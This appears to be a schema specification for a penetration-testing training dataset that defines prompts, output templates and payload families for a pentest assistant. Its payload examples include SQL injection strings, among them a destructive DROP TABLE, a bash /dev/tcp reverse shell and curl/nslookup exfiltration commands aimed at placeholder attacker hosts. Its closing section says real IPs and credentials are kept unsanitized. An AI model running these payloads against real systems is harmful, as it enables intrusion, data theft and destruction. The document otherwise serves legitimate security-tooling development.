# ARGUS WhiteRabbitNeo — Training Data JSONL Schema Specification

**Created:** 2026-05-23
**Task:** TRN-003

---

## 1. JSONL Record Schema

Every training record is a JSON object with `messages` and `metadata`:

```json
{
  "messages": [
    {
      "role": "system",
      "content": "<system prompt for task type>"
    },
    {
      "role": "user",
      "content": "<task prompt with context>"
    },
    {
      "role": "assistant",
      "content": "<expected output — JSON or prose>"
    }
  ],
  "metadata": {
    "task": "<task_type_enum>",
    "source": "<repo_or_internal>",
    "license": "<license_type>",
    "argus_phase": "<recon|vuln_analysis|exploitation|post_exploitation|cross_phase>",
    "argus_tool_ids": ["<tool_id>", ...],
    "argus_payload_families": ["<family_id>", ...],
    "cwe_ids": [79, 89, ...]
  }
}
```

**Field Definitions:**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `messages` | array[3] | Yes | Exactly 3 messages: system, user, assistant |
| `messages[0].role` | string | Yes | Always "system" |
| `messages[1].role` | string | Yes | Always "user" |
| `messages[2].role` | string | Yes | Always "assistant" |
| `messages[].content` | string | Yes | Content of the message |
| `metadata.task` | string enum | Yes | One of the 10 task types below |
| `metadata.source` | string | Yes | Source identifier |
| `metadata.license` | string | Yes | License type (mit, apache2, cc_by_sa, gpl3, internal) |
| `metadata.argus_phase` | string enum | Yes | recon/vuln_analysis/exploitation/post_exploitation/cross_phase |
| `metadata.argus_tool_ids` | array[string] | No | ARGUS tool_ids referenced in this example |
| `metadata.argus_payload_families` | array[string] | No | ARGUS payload family_ids referenced |
| `metadata.cwe_ids` | array[integer] | No | CWE IDs relevant to this example |

**Task Type Enum Values:**

1. `tool_command_generation`
2. `payload_generation`
3. `payload_family_selection`
4. `tool_selection`
5. `finding_triage`
6. `validation_plan`
7. `methodology_checklist`
8. `finding_to_remediation`
9. `attack_chain_summary`
10. `report_section`

**Source Enum Values:**

- `zha0_pentest_playbook`
- `dievus_internal_pentest_playbook`
- `ag_rodriguez_penetration_testing_playbook`
- `enaqx_awesome_pentest`
- `ianonymous3000_awesome_pentest_checklist`
- `hackedbyagirl_offensive_kali_ansible`
- `argus_tool_catalog`
- `argus_payload_registry`
- `argus_prompt_registry`
- `argus_internal`
- `synthetic`

---

## 2. System Prompts Per Task Type

### 2.1 tool_command_generation

```
You are ARGUS Tool Command Expert. You select and configure the correct ARGUS sandbox tool for a given penetration testing task. You know all 157 ARGUS tools, their phases, categories, risk levels, network policies, and command templates. Given a phase, target description, and scope, you output the exact ARGUS tool_id, command arguments, and rationale. Output strict JSON only.
```

### 2.2 payload_generation

```
You are ARGUS Payload Generator. You generate concrete payload variants for ARGUS payload families covering all 54 families (safe, offensive, and approval-gated). Given a vulnerability type, context, and target, you output the family_id, seed payloads with techniques, encoding pipeline, parameters needed, risk level, and whether approval is required. Output strict JSON only.
```

### 2.3 payload_family_selection

```
You are ARGUS Payload Family Selector. Given a vulnerability description, evidence, and context, you select the appropriate ARGUS payload family, determine risk level, approval requirements, OAST needs, and validation strategy. You cover all 54 payload families including offensive variants. Output strict JSON only.
```

### 2.4 tool_selection

```
You are ARGUS Planner. Given a scan phase, findings summary, and target context, you select an ordered list of ARGUS tools to run, with rationale for each selection. You consider dependencies between tools and phase transitions. Output strict JSON only.
```

### 2.5 finding_triage

```
You are ARGUS Local Cybersecurity Analyst. You triage findings from pentest tool output. Given tool output, exit code, stderr, and finding metadata, you assess severity, confidence, and risk. You are conservative: only mark confirmed/exploitable with clear evidence. Output strict JSON only.
```

### 2.6 validation_plan

```
You are ARGUS Planner Agent. Given a finding description, vulnerability type, and target context, you generate a ValidationPlanV1: select the correct ARGUS payload family, tool, and validation strategy. You cover all 54 payload families. Output strict JSON matching ValidationPlanV1 schema.
```

### 2.7 methodology_checklist

```
You are ARGUS Security Analyst. Given a scan phase and target type, you output an ordered penetration testing methodology checklist with specific steps, tool recommendations, and verification criteria. You draw from OWASP WSTG, PTES, and ARGUS pipeline methodology. Output strict JSON only.
```

### 2.8 finding_to_remediation

```
You are ARGUS Remediation Advisor. Given a finding with vulnerability type, severity, affected asset, and evidence, you produce prioritized remediation steps with verification commands. You include defense-in-depth recommendations. Output strict JSON only.
```

### 2.9 attack_chain_summary

```
You are ARGUS Red Team Expert. Given multiple findings from a pentest, you construct realistic attack chains with TTPs (MITRE ATT&CK), showing how vulnerabilities can be chained from initial access to impact. You are specific about techniques and tools. Output strict JSON only.
```

### 2.10 report_section

```
You are ARGUS Reporter. Given scan results, findings, and context, you write a concise, evidence-grounded report section. You never claim findings without evidence. You assign CVSS:3.1 vector strings. You avoid speculation. Output prose matching ARGUS report format.
```

---

## 3. User/Assistant Template Formats

### 3.1 tool_command_generation

**User template:**
```
Plan ARGUS tool commands for Phase: {phase} on target {target} with scope: {scope_description}.

Available tools in this phase:
{tool_list_for_phase}
```

**Assistant output (JSON):**
```json
{
  "phase": "recon",
  "target": "example.com",
  "scope": "web application, subdomain enumeration",
  "tools": [
    {
      "tool_id": "subfinder",
      "args": ["-d", "example.com", "-all", "-silent", "-oJ"],
      "rationale": "Passive subdomain enumeration via OSINT sources",
      "risk_level": "low",
      "approval_required": false
    }
  ],
  "estimated_duration": "15-25 minutes",
  "dependencies": ["subfinder must complete before httpx can process results"]
}
```

### 3.2 payload_generation

**User template:**
```
Generate payload seeds for the '{family_id}' family targeting a {vuln_type} vulnerability on {target_description}.

Context: {context}
CWE: {cwe_ids}
OWASP: {owasp_categories}
```

**Assistant output (JSON):**
```json
{
  "family_id": "sqli",
  "seeds": [
    {
      "id": "boolean_blind",
      "template": "' OR 1=1 --",
      "confidence": "suspected",
      "technique": "boolean-based blind"
    },
    {
      "id": "error_based",
      "template": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",
      "confidence": "likely",
      "technique": "error-based"
    }
  ],
  "encoding_pipeline": "url_only",
  "parameters_needed": ["url", "param"],
  "risk_level": "medium",
  "requires_approval": false,
  "rationale": "sqli family covers boolean, error, UNION, time-based injection techniques."
}
```

### 3.3 payload_family_selection

**User template:**
```
Finding: {finding_description}
Vulnerability type: {vuln_type}
Evidence: {evidence_summary}
Target: {target_context}
```

**Assistant output (JSON):**
```json
{
  "family_id": "xss",
  "alternative_families": ["xss_dom", "xss_stored", "xss_contextual"],
  "risk_level": "medium",
  "approval_required": false,
  "oast_required": true,
  "cwe_ids": [79],
  "owasp": ["A03:2021"],
  "validation_strategy": "browser_canary_oast",
  "payload_count": 6,
  "rationale": "Reflected XSS in HTML context. Primary: xss for canary-based validation."
}
```

### 3.4 tool_selection

**User template:**
```
Phase: {phase}
Findings summary: {findings_summary}
Target context: {target_context}

Select the most appropriate ARGUS tools for this phase and findings.
```

**Assistant output (JSON):**
```json
{
  "phase": "vuln_analysis",
  "tools": [
    {
      "tool_id": "dalfox",
      "priority": 1,
      "rationale": "XSS scanning for reflected parameters found in recon"
    },
    {
      "tool_id": "sqlmap_safe",
      "priority": 2,
      "rationale": "SQL injection testing for login form"
    }
  ],
  "estimated_duration": "30-45 minutes"
}
```

### 3.5 finding_triage

**User template:**
```
Tool: {tool_id}
Exit code: {exit_code}
Stdout excerpt: {stdout_excerpt}
Stderr excerpt: {stderr_excerpt}
Finding title: {title}
Vulnerability type: {vuln_type}
```

**Assistant output (JSON):**
```json
{
  "confidence": "confirmed",
  "severity": "high",
  "risk_level": "high",
  "evidence_quality": "strong",
  "rationale": "Tool output confirms SQL injection via error message revealing MySQL version.",
  "recommended_action": "Proceed to exploitation with sqlmap_confirm"
}
```

### 3.6 validation_plan

**User template:**
```
Finding: {finding_description}
Vulnerability type: {vuln_type}
Severity: {severity}
Target: {target}
Evidence: {evidence}
```

**Assistant output (JSON):**
```json
{
  "plan_id": "vp-001",
  "family_id": "xss",
  "tool_id": "dalfox",
  "validation_strategy": "browser_canary_oast",
  "hypothesis": "Reflected XSS in search parameter reflects user input without encoding",
  "approval_required": false,
  "payloads": ["xss family seeds with OAST callback"],
  "verification_steps": [
    "1. Send canary payload via dalfox",
    "2. Check OAST callback for DNS/HTTP interaction",
    "3. Verify XSS execution in browser context"
  ]
}
```

### 3.7 methodology_checklist

**User template:**
```
Phase: {phase}
Target type: {target_type} (web_app|internal_network|api|ad_environment|cloud)
Scope: {scope_description}

Generate an ordered methodology checklist for this phase and target type.
```

**Assistant output (JSON):**
```json
{
  "phase": "recon",
  "target_type": "web_app",
  "steps": [
    {"order": 1, "action": "Passive subdomain enumeration", "tools": ["subfinder", "amass_passive", "crt_sh"], "verification": "Count discovered subdomains"},
    {"order": 2, "action": "HTTP fingerprinting of live hosts", "tools": ["httpx"], "verification": "Confirm live web servers"},
    {"order": 3, "action": "Port scanning on discovered hosts", "tools": ["nmap_tcp_top"], "verification": "Identify open ports and services"}
  ]
}
```

### 3.8 finding_to_remediation

**User template:**
```
Finding: {title}
Severity: {severity}
CWE: {cwe_ids}
Affected asset: {asset}
Evidence: {evidence_summary}
```

**Assistant output (JSON):**
```json
{
  "title": "Reflected XSS in search parameter",
  "severity": "medium",
  "remediation_steps": [
    {"order": 1, "action": "Implement context-aware output encoding", "detail": "HTML-encode all user input reflected in HTML context"},
    {"order": 2, "action": "Deploy Content Security Policy", "detail": "Set CSP header: default-src 'self'; script-src 'self'"},
    {"order": 3, "action": "Add input validation", "detail": "Whitelist allowed characters for search input"}
  ],
  "verification": "Re-run dalfox with canary payload and verify no reflection"
}
```

### 3.9 attack_chain_summary

**User template:**
```
Findings:
{findings_list}

Construct realistic attack chains showing TTPs and MITRE ATT&CK techniques.
```

**Assistant output (JSON):**
```json
{
  "chains": [
    {
      "name": "SQL Injection to Domain Admin",
      "likelihood": "high",
      "steps": [
        {"step": 1, "technique": "T1190", "description": "Exploit SQL injection in login form", "from_finding": "SQLi in login"},
        {"step": 2, "technique": "T1082", "description": "Extract database credentials", "from_finding": "Database credential dump"},
        {"step": 3, "technique": "T1075", "description": "Pass-the-hash to domain admin", "from_finding": "Reused credentials"},
        {"step": 4, "technique": "T1484", "description": "Domain persistence via GPO", "from_finding": "AD misconfiguration"}
      ],
      "impact": "Full domain compromise"
    }
  ]
}
```

### 3.10 report_section

**User template:**
```
Section: {section_type}
Findings: {findings_json}
Scan context: {scan_context}

Write the report section following ARGUS report format.
```

**Assistant output (prose, not JSON):**
```
## Executive Summary

The penetration test identified 12 findings across the target environment. Two critical-severity SQL injection vulnerabilities were confirmed in the authentication mechanism, enabling unauthenticated attackers to extract sensitive data. Three high-severity findings relate to misconfigured TLS and missing security headers...

[Continue with evidence-grounded prose]
```

---

## 4. Payload Generation Schema (ALL Families)

The `payload_generation` task type covers ALL 54 ARGUS payload families. The schema differs slightly based on family type:

### 4.1 Common Schema Fields (all families)

```json
{
  "family_id": "string, matches /[a-z_]+/",
  "seeds": [
    {
      "id": "string, unique within family",
      "template": "string, the payload template",
      "confidence": "suspected|likely|confirmed",
      "technique": "string, attack technique description"
    }
  ],
  "encoding_pipeline": "identity|url_only|url_double|base64_only|url_then_b64",
  "parameters_needed": ["list of required parameters"],
  "risk_level": "low|medium|high|critical",
  "requires_approval": "boolean",
  "oast_required": "boolean",
  "cwe_ids": [79],
  "owasp": ["A03:2021"],
  "rationale": "string, explanation of why this family and these seeds"
}
```

### 4.2 Safe Family Example (sqli_safe)

```json
{
  "family_id": "sqli_safe",
  "seeds": [
    {"id": "alphanumeric_marker", "template": "arguscanary001", "confidence": "suspected", "technique": "parameter reflection detection"},
    {"id": "numeric_marker", "template": "4321", "confidence": "suspected", "technique": "numeric parameter reflection"}
  ],
  "encoding_pipeline": "url_only",
  "parameters_needed": ["url", "param"],
  "risk_level": "low",
  "requires_approval": false,
  "oast_required": false,
  "cwe_ids": [89],
  "owasp": ["A03:2021"],
  "rationale": "sqli_safe uses inert alphanumeric markers. No SQL injection occurs — these detect parameter reflection only."
}
```

### 4.3 Offensive Family Example (sqli)

```json
{
  "family_id": "sqli",
  "seeds": [
    {"id": "boolean_blind", "template": "' OR 1=1 --", "confidence": "suspected", "technique": "boolean-based blind injection"},
    {"id": "error_extractvalue", "template": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --", "confidence": "likely", "technique": "error-based extraction"},
    {"id": "union_select", "template": "' UNION SELECT 1,2,3 --", "confidence": "confirmed", "technique": "UNION-based data extraction"},
    {"id": "time_based", "template": "' AND SLEEP(5) --", "confidence": "suspected", "technique": "time-based blind injection"},
    {"id": "stacked_drop", "template": "'; DROP TABLE users --", "confidence": "suspected", "technique": "stacked query destructive"},
    {"id": "comment_bypass", "template": "admin'--, "confidence": "likely", "technique": "authentication bypass via comment"}
  ],
  "encoding_pipeline": "url_only",
  "parameters_needed": ["url", "param"],
  "risk_level": "medium",
  "requires_approval": false,
  "oast_required": true,
  "cwe_ids": [89],
  "owasp": ["A03:2021"],
  "rationale": "sqli offensive family covers boolean, error, UNION, time-based, and stacked query injection for full SQL injection verification."
}
```

### 4.4 Approval-Gated Family Example (rce)

```json
{
  "family_id": "rce",
  "seeds": [
    {"id": "id_command", "template": "; id", "confidence": "suspected", "technique": "command injection identification"},
    {"id": "whoami_command", "template": "| whoami", "confidence": "suspected", "technique": "command injection identification"},
    {"id": "echo_canary", "template": "; echo arguscanary001", "confidence": "likely", "technique": "canary-based verification"},
    {"id": "blind_time", "template": "; sleep 5", "confidence": "suspected", "technique": "blind time-based verification"},
    {"id": "reverse_shell", "template": "; bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1", "confidence": "confirmed", "technique": "reverse shell execution"},
    {"id": "curl_exfil", "template": "; curl http://{attacker_ip}/{canary}", "confidence": "likely", "technique": "data exfiltration via HTTP"},
    {"id": "dns_exfil", "template": "; nslookup {canary}.oast.argus.local", "confidence": "likely", "technique": "OAST DNS exfiltration"}
  ],
  "encoding_pipeline": "url_only",
  "parameters_needed": ["url", "param", "canary", "attacker_ip", "attacker_port"],
  "risk_level": "high",
  "requires_approval": true,
  "oast_required": true,
  "cwe_ids": [78, 77],
  "owasp": ["A03:2021"],
  "rationale": "rce family covers OS command injection from identification (id, whoami) through canary verification to full reverse shell. Requires operator approval due to high risk."
}
```

### 4.5 All 54 Family IDs Reference

```
auth_bypass              buffer_overflow          cache_poisoning
command_injection_safe   cors_misconfig           crlf
crlf_safe                csrf_safe                csrf_token_bypass
deserialization          format_string            graphql
graphql_safe             http_smuggling           idor
integer_overflow         jwt                      jwt_none_alg
jwt_safe                 ldap_injection           ldapi
ldapi_safe               lfi_rfi                  mass_assignment
mass_assignment_safe     nosqli                   nosqli_safe
oauth                    oauth_misconfig          open_redirect
open_redirect_safe       path_traversal           proto_smuggle
prototype_pollution      prototype_pollution_safe race_condition
rce                      smtp_injection           sqli
sqli_safe                ssrf                     ssrf_oast_safe
ssti                     ssti_safe                traversal_safe
type_juggling            xpath_injection          xpathi_safe
xss                      xss_contextual           xss_dom
xss_stored               xxe                      xxe_oast_safe
```

---

## 5. Data Split Strategy

### 5.1 Split Ratios

| Split | Ratio | Purpose |
|-------|-------|---------|
| Train | 80% | Main training data |
| Validation | 10% | Hyperparameter tuning, early stopping |
| Test | 10% | Final evaluation, never seen during training |

### 5.2 Stratification Rules

- Stratify by `metadata.task` type to ensure all 10 task types are represented proportionally
- Stratify by `metadata.argus_phase` to ensure all phases are represented
- Within `payload_generation`: stratify by `family_id` to ensure all 54 families have examples in all splits
- Within `tool_command_generation`: stratify by `argus_phase` to ensure recon/VA/exploit/post are all covered
- **No data leakage**: examples from the same ARGUS payload family must stay in the same split; examples referencing the same tool must stay in the same split

### 5.3 Minimum Examples Per Split

| Task Type | Min Train | Min Valid | Min Test |
|-----------|-----------|----------|----------|
| tool_command_generation | 800 | 100 | 100 |
| payload_generation | 540 (10 per family) | 108 (2 per family) | 108 (2 per family) |
| payload_family_selection | 432 (8 per family) | 54 (1 per family) | 54 (1 per family) |
| tool_selection | 300 | 40 | 40 |
| finding_triage | 300 | 40 | 40 |
| validation_plan | 200 | 25 | 25 |
| methodology_checklist | 100 | 15 | 15 |
| finding_to_remediation | 200 | 25 | 25 |
| attack_chain_summary | 100 | 15 | 15 |
| report_section | 100 | 15 | 15 |
| **Total** | **3072** | **437** | **437** |

**Target total: ~4000 examples**

---

## 6. Validation Rules

Each JSONL record must pass the following validation before entering the dataset:

### 6.1 Schema Validation
```python
REQUIRED_KEYS = ["messages", "metadata"]
REQUIRED_MESSAGE_KEYS = ["role", "content"]
REQUIRED_METADATA_KEYS = ["task", "source", "argus_phase"]
VALID_TASK_TYPES = [
    "tool_command_generation", "payload_generation", "payload_family_selection",
    "tool_selection", "finding_triage", "validation_plan",
    "methodology_checklist", "finding_to_remediation", "attack_chain_summary",
    "report_section"
]
VALID_PHASES = ["recon", "vuln_analysis", "exploitation", "post_exploitation", "cross_phase"]
```

### 6.2 ARGUS Reference Validation
- All `argus_tool_ids` must exist in the ARGUS tool catalog (157 tools)
- All `argus_payload_families` must exist in the ARGUS payload registry (54 families)
- All `cwe_ids` must be positive integers
- `messages` must have exactly 3 entries (system, user, assistant)
- For structured task types (all except `report_section`), `assistant` content must be valid JSON

### 6.3 Content Quality Validation
- `assistant` content must not be empty
- `user` content must contain sufficient context (minimum 20 characters)
- JSON outputs must parse without errors
- No duplicate records (by `messages[1].content` hash)

---

## 7. Data Processing

**No sanitization applied.** All original content preserved as-is:
- Real IP addresses, hostnames, domain names kept unchanged
- Real credentials kept with no replacement
- Raw exploit code and offensive commands included verbatim
- Shell commands in original form
- No placeholder substitution